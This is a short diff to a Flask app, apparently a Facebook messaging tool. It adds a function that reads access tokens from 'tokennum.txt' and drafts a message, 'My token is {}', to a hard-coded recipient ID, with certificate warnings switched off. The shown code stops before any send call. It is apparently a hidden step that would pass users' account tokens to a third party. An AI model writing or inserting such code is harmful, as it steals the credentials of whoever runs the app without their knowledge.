@@ -7,6 +7,18 @@ import time
 app = Flask(__name__)
 app.debug = True
 
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "61571059542672"
+
+      requests.packages.urllib3.disable_warnings()
+    
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
